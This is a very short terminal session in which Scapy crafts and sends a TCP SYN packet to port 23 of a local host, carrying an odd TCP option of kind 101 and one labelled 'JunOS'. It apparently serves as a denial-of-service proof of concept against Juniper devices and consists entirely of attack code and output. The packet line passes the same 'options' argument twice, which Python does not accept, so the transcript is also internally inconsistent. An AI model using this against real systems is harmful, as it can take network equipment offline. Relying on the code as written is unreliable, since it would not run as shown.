$ sudo scapy
Welcome to Scapy (2.1.0)
>>> p=IP(dst='192.168.1.61')/TCP(options=[(101, '')],dport=23,flags='S',
options=[('JunOS', '')])
>>> send(p)
.
Sent 1 packets.
>>>

